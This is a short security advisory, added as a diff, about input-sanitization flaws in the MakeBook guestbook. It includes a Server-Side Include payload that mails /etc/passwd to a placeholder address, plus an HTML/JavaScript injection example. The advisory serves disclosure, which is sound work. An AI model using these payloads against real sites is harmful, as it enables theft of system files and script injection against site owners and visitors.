@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/4996/info
+
+The MakeBook guestbook software does not sufficiently sanitize potentially dangerous characters from form field input. This may enable attackers to inject arbitrary HTML into form fields, which will be stored on guestbook pages. Additionally, it has been demonstrated that SSI (Server-Side Includes) may also be injected in this manner, and may be executed depending on the underlying environment. 
+
+Server-Side Include example:
+
+Name: <!--#exec cmd="/bin/mail address@host < /etc/passwd"-->
+
+HTML Injection example:
+
+Name: <img src="javascript:alert('test');"> 
